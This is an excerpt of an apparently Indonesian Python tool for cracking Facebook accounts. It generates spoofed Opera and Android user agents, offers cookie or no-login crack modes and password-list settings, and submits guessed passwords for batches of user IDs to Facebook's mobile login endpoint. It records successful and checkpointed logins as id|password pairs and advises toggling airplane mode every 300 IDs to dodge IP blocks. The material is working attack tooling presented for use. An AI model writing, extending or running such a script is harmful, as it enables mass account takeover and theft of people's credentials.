...
for t in range(10000):
	...
	random1=random.choice(['Opera/9.80','Opera/9.80','Opera/9.80','Opera/9.80','Opera/9.80','Opera/9.80','Opera/9.80','Opera/9.80'])
	random2=random.choice(['Opera/12.80','Opera/12.80','Opera/12.80','Opera/12.80','Opera/9.80','Opera/9.80','Opera/9.80','Opera/9.80'])
	random3=random.choice(['Opera/9.80','Opera/12.80','Opera/12.80','Opera/12.80','Opera/9.80','Opera/9.80','Opera/9.80','Opera/9.80'])
	random4=random.choice(['Opera/9.80','Opera/9.80','Opera/9.80','Opera/9.80','Opera/9.80','Opera/9.80','Opera/9.80','Opera/9.80'])
	random5=random.choice(['SM-J415N','SM-R765T','SM-A730F','SM-A605G','SM-J610F','SM-N9750','SM-G935A'])
	random6=random.choice(['SM-J415N','SM-R765T','SM-A730F','SM-A605G','SM-J610F','SM-N9750','SM-G935A'])
	ayilxd1=f'Opera/9.80 {a}; {random1} (Windows NT 6.1; WOW64; U; pt){b}.{c}.0{d}; wv) Presto/2.10.229{e}.0.{f}.{g} Version/11.62'
	ayilxd2=f'Opera/9.80 {a}; {random2} (X11; Linux x86_64; U; bg){b}.{c}.0{d}; wv) Presto/2.8.131{e}.0.{f}.{g} Version/11.10'
	ayilxd3=f'Opera/9.80 {a}; {random2} (Windows NT 6.1; U; zh-tw){b}.{c}.0{d}; wv) Presto/2.5.22{e}.0.{f}.{g} Version/10.50'
	ayilxd4=f'Opera/9.80 (Windows NT 6.1; WOW64; U; pt) {a}; {random3} Presto/2.10.229{e}.0.{f}.{g} Version/11.62'
	ayilxd5=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	ayilxd6=f'Mozilla/5.0 (Linux; Android {a}; {random2} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	uaku2 = random.choice([ayilxd1,ayilxd2,ayilxd3,ayilxd4,ayilxd5,ayilxd6])
	ugen.append(uaku2)
...
def login123():
	os.system('clear')
	banner()
	cetak(panel(f'[bold white][[bold purple]01[/][bold purple]][/] [bold purple]Login Menggunakan Cookie [[bold purple] ON [bold purple]][/]\n[bold purple][[bold purple]02[/][bold purple]][/] [bold purple]Menu Crack Tanpa Login [[bold purple] ON [bold purple]][/]\n[bold purple][[bold purple]00[/][bold purple]][/] [bold red]Keluar Dari Script [[bold purple] ON [bold purple]][/]',width=90,title=f"[bold purple]Pilihan Login",style=f"bold green"))
...
def login_lagi334():
	try:
		cetak(nel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=90,style=f"bold purple"))
...
def setting():
	...
	if hc in ['1','01']:
		...
		method.append('mobile')
	cetak(panel('''[bold white][[bold cyan]01[bold white]] [bold white]Menggunakan Password V1 [[bold green]Recommended[bold blue]]
[bold white][[bold cyan]02[bold white]] [bold white]Menggunakan Password V2 [[bold green]Very Recommended[bold blue]]
[bold white][[bold cyan]03[bold white]] [bold white]Menggunakan Password Manual [[bold red]Not Recommended[bold blue]]''',style='bold green',title='[bold green]Setting Password',padding=(0,8),width=90))
	...
	cetak(panel(f'[bold white]Ingin Menggunakan User Agent Bwaan Script ? Y/T',width=90,title=f"[bold green]Setting User-Agent",style=f"bold blue"))
	uatambah = input(f' ╰─  Pilih : ')
	if uatambah in ['t','TT','tt','T']:
		ualuh.append('ya')
...
def passwrd():
	...
	cetak(panel(f'\t[bold white]On/Off Mode Pesawat Setiap 300 Idz Agar Terhindar Dari Spam Ip',width=90,title=f"[bold green]Informasi",subtitle=f"[bold green]Proses Crack",style=f"bold blue"))
...
def crack(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			p = ses.get('https://m.facebook.com/login/device-based/regular/login/?api_key=1489897304628200&auth_token=3679bf3d495fdad0cdfde34913f10bbf&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fapp_id%3D1489897304628200&refsrc=deprecated&app_id=1489897304628200&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46&lwv=100&locale2=id_ID&refid=9')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login/device-based/regular/login/?api_key=1489897304628200&auth_token=3679bf3d495fdad0cdfde34913f10bbf&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fapp_id%3D1489897304628200&refsrc=deprecated&app_id=1489897304628200&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46&lwv=100&locale2=id_ID&refid=9","flow":"login_no_pin","pass":pw,}
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[ Meng CP ]").add(f"[bold green]{cektahun(idf)}").add(f"[bold yellow]{idf}|{pw}").add(f"[bold white]{ua}\n")
				cetak(tree)
				...
				tree = Tree(f"  ")
				tree.add(f"[ Mantap-Game ]").add(f"[bold yellow]{cektahun(idf)}").add(f"[bold green]{idf}|{pw}").add(f"[bold red]{ua}\n")
				cetak(tree) 
